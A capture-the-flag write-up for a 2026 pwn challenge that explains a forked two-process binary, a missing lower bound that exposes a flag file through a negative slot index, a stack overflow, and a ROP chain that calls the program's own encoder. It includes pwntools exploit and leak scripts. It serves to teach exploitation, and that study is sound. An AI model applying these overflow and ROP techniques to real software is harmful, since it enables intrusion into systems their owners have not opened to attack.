---
title: "Safe House — Getting Past an Encrypted Protocol Without Breaking It"
date: 2026-10-21
tags: ["pwn", "rop", "seccomp", "ipc"]
categories: ["SunshineCTF 2026"]
summary: "The process holding the flag and the process taking input are split apart, and the protocol between them is XORed. Instead of recovering the key, call the encoder."
translationKey: "safe-house"
---

## Overview

```
service   amd64, No PIE, Full RELRO, no canary, NX, SHSTK, IBT
```

Running it gives an `sh> ` prompt taking commands: `PING HELP NOTE RELAY SUBMIT QUIT`.

The structure that matters is all in `main` (`FUN_00401290`). A `socketpair` followed by `fork`, with each side looking at the other through its own fd 3.

```
parent (CLI)                     child (vault)
  parse user input                 holds the flag.txt fd
  encode packet → fd 3             manages the slot table
  fd 3 → decode response           handles requests, replies
```

## 1. seccomp picks the goal

Only the parent gets a filter. `prctl(PR_SET_NO_NEW_PRIVS)` then `syscall(317, ...)`, falling back to `prctl(PR_SET_SECCOMP, 2)` on failure.

```
read  write  close  mmap  mprotect  brk  rt_sigreturn  exit_group
```

No `open`, no `execve`. Code execution in the parent cannot open a file, and a shell would have nothing to do.

The child has no filter at all. Its branch right after `fork` calls `open` several times.

```c
_DAT_00405084 = open("flag.txt", 0);
_DAT_00405080 = 2;
```

**The sandbox is on the side that can be taken over, and the capability is on the side that cannot.** So the goal stops being "get a shell" and becomes "send the child the right request." Every decision after this follows from that.

## 2. The protocol

### The frame

`FUN_00401d50` is the send function, taking `(opcode, buf, len)`.

```
[opcode:1][len:2 BE][pad:1]  +  [payload]
```

No CRC, no terminator. The 4-byte header and the payload are encoded separately and written with two `write(3, ...)` calls.

The only thing to watch is that the length is big-endian.

```c
local_42b = param_3 << 8 | param_3 >> 8;
```

### The XOR layer

`FUN_00401be0(buf, len, key)` is the encoder.

```c
local_4 = param_3 >> 0x18 | (param_3 & 0xff0000) >> 8
        | (param_3 & 0xff00) << 8 | param_3 << 0x18;
...
param_1[lVar1] = param_1[lVar1] ^ *(byte *)((long)&local_4 + (ulong)((uint)lVar1 & 3));
```

It byte-swaps the key into a local and indexes it with `i & 3`. On little-endian that byte order is the original key's MSB to LSB, so the keystream is `p32(key, endian='big')` repeating every 4 bytes, restarting at offset 0 on each call.

The key is derived from the parent's pid **before** the fork.

```c
_Var3 = getpid();
uVar4 = ((uint)(_Var3 * 0x45d9f3b) >> 0x10 ^ _Var3 * 0x45d9f3b) * 0x45d9f3b;
DAT_00405060 = uVar4 ^ uVar4 >> 0x10;
```

Both sides therefore start with the same key, and it differs every run.

### Opcodes

The child loop's dispatch has four.

| opcode | behavior |
|---|---|
| 1 | fixed 2-byte reply |
| 2 | store into the next public slot, return its index |
| 3 | read a slot by index |
| 4 | `vault: 4 system, N/16 public` |

Opcode 2 does not let the index be chosen; `DAT_00405064` increments on its own.

Opcode 4 is a status string. It has nothing to do with the CLI's `SUBMIT`.

## 3. The slot table and negative indices

The child keeps two groups of slots.

```
system  0x405080 + k * 0x40c    k = 0..3
public  0x4060b0 + i * 0x40c    i = 0..15
```

`0x4060b0 - 0x405080 = 0x1030 = 0x40c * 4`. The system group sits immediately in front of the public group, exactly four entries. So relative to the public table, **the system slots are indices -4 through -1**, and -4 is the `flag.txt` slot.

A slot is `+0x00` type, `+0x04` fd, `+0x08` length, `+0x0c` data. Type 1 is inline data, type 2 is fd-backed.

The op 3 handler's bounds check:

```c
else if ((int)local_1038 < 0x10) {
    lVar5 = (long)(int)local_1038 * 0x40c;
    if (*(int *)(&DAT_004060b0 + lVar5) == 1) {
        FUN_00401d50(0, &DAT_004060bc + lVar5, *(undefined2 *)(&DAT_004060b8 + lVar5));
    }
    else if (*(int *)(&DAT_004060b0 + lVar5) == 2) {
        uVar8 = pread(*(int *)(&DAT_004060b4 + lVar5), &local_1438, 0x400, 0);
        ...
```

A signed cast, then an upper bound only. With no lower bound, a negative index passes. Index -4 resolves to type 2, so the child runs `pread(flag_fd, buf, 0x400, 0)` and returns the contents as its reply.

**As far as the protocol is concerned, asking for the flag is a well-formed request.** This isn't breaking into the vault; it's asking the vault to do its job.

And the hint is inside the protocol. Opcode 4 prints `4 system` verbatim.

The problem is delivering it. Building an opcode 3 packet carrying a negative index means getting past the encoder, and the CLI has no command that sends one. `RELAY` takes only an op number and sends a zero-length header.

```c
lVar1 = strtol(param_1, (char **)0x0, 10);
if (lVar1 - 1U < 4) {
    local_10c = (undefined1)lVar1;
    local_109 = 0;
    local_10b = 0;
```

There is nowhere to put a payload. Hence the need for a second bug.

## 4. The SUBMIT overflow

```c
void FUN_00401ed0(char *param_1)
{
  undefined1 auStack_48 [64];
  ...
  uVar1 = strtol(param_1, (char **)0x0, 10);
  if ((char)uVar1 != '\0') {
    write(1, &DAT_0040302c, 3);
    sVar2 = read(0, auStack_48, uVar1 & 0xff);
```

A 64-byte buffer and a read length of `uVar1 & 0xff`. The check is `(char)uVar1 != 0`, which only rejects sizes whose low byte is zero. 255 passes and overflows by 191 bytes. The return address is 72 bytes in.

No canary and No PIE, so that is ROP outright.

The use of `read` matters too. It doesn't stop at a NUL, so a chain full of addresses goes in as-is.

## 5. Why recovering the key was abandoned

The first thing done once ROP worked was to dump the key. That is what `leak.py` does.

```python
chain = flat(
    POP_RDI, STR4,
    STRLEN,
    POP_RDI, 1,
    POP_RSI, KEY_ADDR,
    MOV_RDX_RAX_JMP_WRITE,
    RET,
)
```

`write(1, 0x405060, 4)` prints the 4-byte key, and the packet to send is computed from it.

```python
header = xor(bytes([3, 0x00, 0x04, 0x00]), stream)
body = xor(p32(0xfffffffc), stream)
```

That much worked. But this direction means pulling the key and rebuilding the packet every run, and reproducing the encoder's details exactly.

Calling `FUN_00401d50` makes all of that disappear. Hand it a plaintext payload and the function assembles the frame, encodes it, and sends it. The key never has to be known.

Arbitrary function calls were already available through ROP, so the choice was clear. And the `strlen` → `mov rdx,rax` combination built for `leak.py` carries over unchanged.

## 6. Building the chain

### Producing rdx

`FUN_00401d50(opcode, buf, len)` needs a third argument, and there is no `pop rdx` gadget. Route through a function that returns a length.

```
pop rdi ; ret            → "sh> "
strlen@plt               → rax = 4
mov rdx, rax ; jmp write → rdx = 4
```

The `"sh> "` at `0x4030ba` is the prompt string, and its length is 4. That is the value both scripts need — `leak.py` to print 4 key bytes, `exploit.py` to send a 4-byte index.

The third gadget is not a byte fragment found by scanning. It is the tail of `FUN_00401c20`, the program's own print-string helper.

```asm
401c20:  push   %rbx
401c21:  mov    %rdi,%rbx
401c24:  call   4011b0 <strlen@plt>
401c29:  mov    %rbx,%rsi
401c2c:  mov    $0x1,%edi
401c31:  pop    %rbx
401c32:  mov    %rax,%rdx
401c35:  jmp    401190 <write@plt>
```

It finishes `write(1, s, strlen(s))` in two instructions. Entering at `0x401c32` leaves only the `rdx = rax` transfer and the tail jump into `write`.

The entry point landing after `pop rbx` is what makes it usable. Skipping that `pop` means the stack isn't shifted, and `rdi` and `rsi` are set before it, so the gadget doesn't clobber them either. That is why the chain sets `rdi = 1` and `rsi = "sh> "` itself.

Since `write` was entered by `jmp`, its `ret` takes the next chain slot and the flow continues, with `rdx` preserved. One dummy `write(1, "sh> ", 4)` goes out, printing a fake prompt, which is harmless.

### Staging the payload

The buffer handed to `FUN_00401d50` has to be at a fixed address, and the stack moves.

The CLI's `NOTE` does it. This has nothing to do with protocol opcode 2 — it writes into the parent's own BSS buffers.

```c
uVar7 = strtol(pcVar14 + 5, &local_1438, 10);
if (uVar7 < 8) {
    ...
    pcVar14 = strncpy(&DAT_0040a180 + uVar7 * 0x40, local_1438, 0x3f);
```

Eight slots, stride `0x40`, base `0x40a180`. The index is compared as `ulong`, so negatives are blocked here.

```python
note(p, 0, p32(0xfffffffc))
note(p, 1, b'1')
```

Being `strncpy`, it stops at a NUL. `p32(0xfffffffc)` is `fc ff ff ff` with no NUL, so all four bytes land. The negative index happens to be a NUL-free value, which is what makes this path work.

### Reading the response

The child's reply is encoded as well. Appending the receive function `FUN_00401f70` to the chain handles decoding and printing internally.

This is the least obvious part of the chain. `FUN_00401f70` sends the op number it was given and reads **immediately**.

```c
FUN_00401be0(__buf, 4, DAT_00405060);
write(3, __buf, 4);
sVar2 = read(3, &local_108, 0x100);
if (3 < sVar2) {
    FUN_00401be0(&local_108, sVar2, DAT_00405060);
    uVar3 = (short)local_107 << 8 | (short)local_106;
    if (((local_108 == '\0') && (uVar3 != 0)) && (uVar3 <= (ushort)((short)sVar2 - 4U))) {
        write(1, local_104, ...);
```

By the time that `read` runs, the reply to the preceding opcode 3 request is already sitting in the socket. So **it picks up and prints the response to the request pushed in earlier, not to the one it just sent.**

Which is why the `"1"` it receives carries no meaning. It is just the smallest value that passes the `lVar1 - 1U < 4` check. The child handles requests in order, so this is deterministic regardless of timing.

## 7. The final chain

```python
note(p, 0, p32(0xfffffffc))
note(p, 1, b'1')

chain = flat(
    POP_RDI, STR4,
    STRLEN,
    POP_RDI, 1,
    POP_RSI, STR4,
    MOV_RDX_RAX_JMP_WRITE,
    POP_RDI, 3,
    POP_RSI, NOTES + 0 * 0x40,
    SEND,
    POP_RDI, NOTES + 1 * 0x40,
    RELAY,
)

payload = b'A' * OFFSET + chain
p.sendlineafter(b'sh> ', b'SUBMIT 255')
p.recvuntil(b'GO\n')
p.send(payload.ljust(255, b'\x00'))
```

```
1. rdx = 4                         strlen("sh> ")
2. FUN_00401d50(3, 0x40a180, 4)    opcode 3, index -4
3. FUN_00401f70(0x40a1c0)          receive, decode and print the pending reply
```

Not one byte of the encrypted protocol was constructed by hand. The whole exploit is the program's own functions called in a different order.

## Notes

- The sandbox and the capability live in different processes. The most the parent can do is `write(3, ...)`, and that is exactly what is needed. `write` being on the seccomp list is what points at the intended path.
- When an encryption layer shows up, recovering it and routing around it cost very different amounts. If a function inside the binary already does the work, all that's needed is the ability to call it. The bypass chain is longer (7 slots to 16), but it is written once and works every run, where key recovery means pulling the key and rebuilding the packet each time.
- The difference between `strncpy` and `read` decided the staging strategy. NOTE cannot hold arbitrary bytes because it stops at a NUL, but its address is fixed; SUBMIT passes NULs but lives on the stack. Each is used for what it is good at.
- checksec shows SHSTK and IBT enabled. ROP worked, so neither was enforced at runtime. They are declared as ELF properties, and without kernel and CPU support plus activation behind them they have no effect.

---

Full scripts: [ctf-writeups/2026-sunshine/safe-house](https://github.com/wjddml/ctf-writeups/tree/main/2026-sunshine/safe-house)
